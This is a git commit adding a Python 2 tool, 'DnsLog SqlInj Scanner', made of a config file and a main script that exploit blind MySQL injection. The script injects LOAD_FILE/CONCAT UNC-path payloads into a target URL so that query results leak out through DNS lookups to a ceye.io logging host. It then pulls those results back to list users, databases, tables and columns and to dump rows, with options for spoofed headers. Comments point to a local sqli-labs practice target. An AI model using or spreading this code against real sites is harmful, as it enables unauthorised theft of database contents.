53820d328f9da45afeacbb874dc2b1347af079c6
517686048@qq.com <ado@ADOdeMacBook-Pro.local>
2018-05-28 22:34:13 +0800

    FristTime

---
+++ config.py
@@ -0,0 +1,90 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+# DNSlog 设置
+APItoken = 'you_ceye_api'
+DNSurl = 'you_ceye_addr'
+
+# 超时时间
+timeout = 30
+
+# 多线程线程数
+# thread_count = 10
+
+# 是否允许URL重定向
+allow_redirects = True
+
+# 是否允许随机User-Agent
+allow_random_useragent = False
+
+# 是否允许随机X-Forwarded-For
+allow_random_x_forward = False
+
+
+
+
+USER_AGENTS = [
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
+	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
+	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
+	"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
+	"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
+	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
+	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
+	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
+	"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
+	"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
+	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
+	"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
+	"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
+	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
+	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
+	"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
+]
+
+# 随机生成User-Agent
+def random_useragent(condition=False):
+	if condition:
+		return random.choice(USER_AGENTS)
+	else:
+		return USER_AGENTS[0]
+
+# 随机X-Forwarded-For，动态IP
+def random_x_forwarded_for(condition=False):
+	if condition:
+		return '%d.%d.%d.%d' % (random.randint(1, 254),random.randint(1, 254),random.randint(1, 254),random.randint(1, 254))
+	else:
+		return '8.8.8.8'
+
+# HTTP 头设置
+headers = {
+	'User-Agent': random_useragent(allow_random_useragent),
+	'X_FORWARDED_FOR': random_x_forwarded_for(allow_random_x_forward),
+	'Referer' : 'http://www.baidu.com',
+	'Cookie': "",
+}
+
+def banner():
+	"""
+	@DnsLog SqlInj banner
+	"""
+	str = """_______________________________________________________________
+	 _____            _                   _____       _ 
+	|  __ \          | |                 |_   _|     (_)
+	| |  | |_ __  ___| |     ___   __ _    | |  _ __  _ 
+	| |  | | '_ \/ __| |    / _ \ / _` |   | | | '_ \| |
+	| |__| | | | \__ \ |___| (_) | (_| |  _| |_| | | | |
+	|_____/|_| |_|___/______\___/ \__, | |_____|_| |_| |
+	                               __/ |            _/ |
+	                              |___/            |__/ 
+
+	DnsLog SqlInj Scanner by ADO
+	Version 1.0
+	https://adooo.github.io/
+_______________________________________________________________
+	"""
+	print str
+
+
+
---
+++ dnslogSql.py
@@ -0,0 +1,301 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+import requests
+from config import *
+import json
+import optparse
+import sys
+import time
+from termcolor import *
+import random
+from string import letters
+
+import gevent
+from gevent import monkey; monkey.patch_all()
+
+from Queue import Queue
+
+
+class DnsSql(object):
+	def __init__(self, options):
+		self.APItoken = APItoken
+		self.DNSurl = DNSurl
+		# self.queue = Queue()
+		self.options = options
+		self.injUrl = options.url
+		self.taskname = options.taskname
+		self.thread_count = int(options.thread_count)
+
+		self.column = options.column
+		self.columns = options.columns
+
+		self.table = options.table
+		self.tables = options.tables
+
+		self.db = options.db
+		self.dbs = options.dbs
+
+		self.dump = options.dump
+
+		self.dbUser = "select hex(user())"
+		self.dbDb = "select hex(database())"
+		self.dbPayload = "select hex(schema_name) from information_schema.schemata"
+
+		if self.db:
+			self.dbP = '0x'+self.db.encode('hex')
+			self.tablePayload = "select hex(table_name) from information_schema.tables where table_schema={db}".format(db=self.dbP)
+		
+		if self.table:
+			self.tableP = '0x'+self.table.encode('hex')
+			self.columnPayload = "select hex(column_name )from information_schema.columns where table_name={table}".format(table=self.tableP)
+		
+		if self.column:
+			self.dataPayload = "select hex(concat_ws(0x3a,{column})) from {db}.{table}".format(db=self.db,table=self.table,column=self.column)
+			self.dataPayloadCount = "select hex(concat_ws(0x3a,count(*))) from {db}.{table}".format(db=self.db,table=self.table)
+		# self.work = work
+
+	def getInf(self):
+		print '[!]Testing Target and Try to get current information!\n'
+		# taskname = 'infuser{}'.format(self.taskname)
+		taskname = ''.join([random.choice(letters) for j in range(6)])
+		origin = 'inf'
+		result = []
+		userPayload = self.payloadBuilt(taskname, self.dbUser)
+		# print userPayload
+		if self.runPayload(userPayload) == 'True':
+			user = self.getDnsData(taskname)
+			user = self.decode(user)
+			print '[*]Current user:\t{}'.format(colored(user,'red'))
+			result.append(user)
+
+		# taskname = 'infdb{}'.format(self.taskname)
+		taskname = ''.join([random.choice(letters) for j in range(6)])
+		dbPayload = self.payloadBuilt(taskname, self.dbDb)
+		if self.runPayload(dbPayload) == 'True':
+			db = self.getDnsData(taskname)
+			db = self.decode(db)
+			print '[*]Current data:\t{}'.format(colored(db,'red'))
+			result.append(db)
+
+		return result
+
+
+
+	def getData(self):
+		# taskname = 'datalen{}{}{}{}'.format(self.column,self.table,self.db,self.taskname)
+
+		if self.dump:
+			try:
+				print '[*]Database:{} Table:{} Column:{}'.format(colored(self.db,'red'),colored(self.table,'red'),colored(self.column,'red'))
+				taskname = ''.join([random.choice(letters) for j in range(6)])
+				origin = 'data'
+				length = int(self.getLength(self.dataPayloadCount, origin))
+				self.threadRun(length, origin)
+			except Exception,e:
+				return e.message
+
+		elif self.columns:
+			try:
+				print '[*]Database:{} Table:{} '.format(colored(self.db,'red'),colored(self.table,'red'))
+				taskname = ''.join([random.choice(letters) for j in range(6)])
+				origin = 'column'
+				length = int(self.getLength(self.columnPayload, origin))
+				self.threadRun(length, origin)
+			except Exception,e:
+				return e.message
+
+		elif self.tables:
+			try:
+				print '[*]Database:{}'.format(colored(self.db,'red'))
+				taskname = ''.join([random.choice(letters) for j in range(6)])
+				origin = 'table'
+				length = int(self.getLength(self.tablePayload, origin))
+				self.threadRun(length, origin)
+			except Exception,e:
+				return e.message
+
+		elif self.dbs:
+			try:
+				print '[*]Fecting Database.'
+				taskname = ''.join([random.choice(letters) for j in range(6)])
+				origin = 'db'
+				length = int(self.getLength(self.dbPayload, origin))
+				self.threadRun(length, origin)
+			except Exception,e:
+				return e.message
+				# print e
+
+		else:
+			self.getInf()
+			sys.exit(0)
+
+
+
+	def threadRun(self, length, model):
+		print '[*]Get data count: {}'.format(colored(length,'red'))
+		queue = Queue()
+		for i in range(length):
+			queue.put(i)
+
+		gevent_pool = []
+
+		for i in range(self.thread_count):
+			gevent_pool.append(gevent.spawn(self.dumps, queue, model))
+		gevent.joinall(gevent_pool)
+
+
+	def dumps(self, queue, model):
+		while not queue.empty():
+			if model == 'db':
+				payload = self.dbPayload
+			if model == 'table':
+				payload = self.tablePayload
+			if model == 'column':
+				payload = self.columnPayload
+			if model =='data':
+				payload = self.dataPayload
+
+			count = queue.get_nowait()
+			taskname = ''.join([random.choice(letters) for j in range(6)])
+
+			dumpPayload = self.payloadBuilt(taskname, payload + ' limit {},1'.format(count))
+			
+			# 获取数据的payload
+			# print dumpPayload
+
+			if self.runPayload(dumpPayload) == 'True':
+				result = self.getDnsData(taskname)
+				result = self.decode(result)
+				print '[*]Data {}:\t{}'.format(int(count)+1,colored(result,'red')) 
+
+	def getLength(self, payload, origin):
+
+		# print origin
+
+		if origin == 'db':
+			payload = payload.replace('schema_name', 'count(*)')
+
+		if origin == 'table':
+			payload = payload.replace('table_name', 'count(*)')
+
+		if origin == 'column':
+			payload = payload.replace('column_name', 'count(*)')
+
+		if origin == 'data':
+			payload = payload
+
+		taskname = ''.join([random.choice(letters) for j in range(6)])
+		lenPayload = self.payloadBuilt(taskname, payload)
+		
+		# 获取数据数量的payload
+		# print lenPayload
+
+		if self.runPayload(lenPayload) == 'True':
+			length = self.decode(self.getDnsData(taskname))
+			return length
+
+
+	def runPayload(self, payload):
+		try:
+			r = requests.get(url=payload, headers=headers, timeout=timeout)
+			return 'True'
+		except Exception,e:
+			# print e
+			return e.message
+
+
+	def decode(self, code):
+		data = code
+
+		try:
+			return data.decode('hex')
+		except:
+			return int(data,16)
+
+
+	# def lendecode(self, code):
+	# 	data = code
+	# 	try:
+	# 		return int(data,16)
+	# 	except Exception,e:
+	# 		print e
+	# 		return e
+
+	def getDnsData(self, taskname):
+		try:
+			APIurl = 'http://api.ceye.io/v1/records?token={token}&type={dns}&filter={filter}'.format(token=self.APItoken, dns='dns', filter=taskname)
+
+			r = requests.get(APIurl)
+
+			data = json.loads(r.text)
+			
+			# print data
+
+			result = data['data'][0]['name'].split('.'+taskname)[0]
+			return result
+		except Exception,e:
+			# print e
+			return e.message
+
+	def payloadBuilt(self, taskname, payload):
+		reqUrl = '.{}.mysqlinj.{}'.format(taskname,self.DNSurl)
+		payloadUrl = r'''SELECT LOAD_FILE(CONCAT('\\\\',({payload}),'{reqUrl}\\abc'))'''.format(payload=payload, reqUrl=reqUrl)
+		url = self.injUrl.format(payloadUrl)
+		return url
+
+def run(options):
+	sql = DnsSql(options)
+	sql.getData()
+
+
+
+# sql = DnsSql("http://10.211.55.9/sqli-labs/Less-1/?id=' union select ({}),2,3--+",'taskname')
+# sql.getDb()
+# sqlInj("http://10.211.55.9/sqli-labs/Less-1/?id=' union select 1,({}),3--+", 'sqltest')
+
+# python dnslogSql.py -u "http://10.211.55.9/sqli-labs/Less-1/?id=' union select 1,({}),3--+" -i
+
+
+if __name__ == '__main__':
+	start_time = time.strftime("%Y-%m-%d %H:%M:%S")
+	banner()
+
+	print '[-]{}\n'.format(start_time)
+	parser = optparse.OptionParser("usage: %prog [options] http://10.211.55.9/sqli-labs/Less-1/?id=' union select 1,({}),3--+", version="%prog 1.1")
+	parser.add_option("-n","--name", dest='taskname', default='dnsloginj',  help="task name")
+	parser.add_option("-t","--thread", dest='thread_count', default='5',  help="thread_count")
+	parser.add_option("-u","--url", dest='url', default='',  help="target include injection")
+	parser.add_option("-i","--inf", dest='inf', default='',  help="Testing target and Try to get information")
+
+	parser.add_option("--dbs", dest='dbs', default='',  action='store_true', help="get database")
+	parser.add_option("-D", dest='db', default='',  help="database name")
+
+	parser.add_option("--tables", dest='tables', default='', action='store_true', help="get table")
+	parser.add_option("-T", dest='table', default='',  help="table name")
+
+	parser.add_option("--columns", dest='columns', default='', action='store_true', help="get column")
+	parser.add_option("-C", dest='column', default='',  help="column name")
+
+	parser.add_option("--dump", dest='dump', default='', action='store_true', help="get data")
+
+	(options, args) = parser.parse_args()
+
+	try:
+		# if len(sys.argv[1:]) == 0:
+		# 	parser.print_help()
+		# 	sys.exit(0)
+		if options.url:
+			run(options=options)
+		else:
+			parser.print_help()
+			sys.exit(0)
+
+	except KeyboardInterrupt:
+		# logging.info("Ctrl C - Stopping Client")
+		print "Ctrl C - Stopping Client"
+		sys.exit(1)
+
+
+
+
